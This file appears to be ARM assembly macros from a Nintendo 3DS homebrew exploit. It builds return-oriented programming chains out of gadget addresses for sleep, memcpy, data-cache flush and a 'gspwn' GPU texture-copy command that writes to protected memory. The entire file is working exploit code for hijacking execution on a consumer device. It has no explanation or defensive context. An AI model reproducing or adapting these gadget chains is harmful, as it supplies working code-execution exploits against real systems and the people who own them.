.macro set_lr,_lr
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word ROP_SMD_NOP ; pop {pc}
	.word ROP_SMD_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word SMD_SVC_SLEEPTHREAD
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word SMD_MEMCPY
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word SMD_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_SMD_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word SMD_COMP_BUFFER + @@gxCommandPayload ; r1 (cmd addr)
	.word SMD_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro
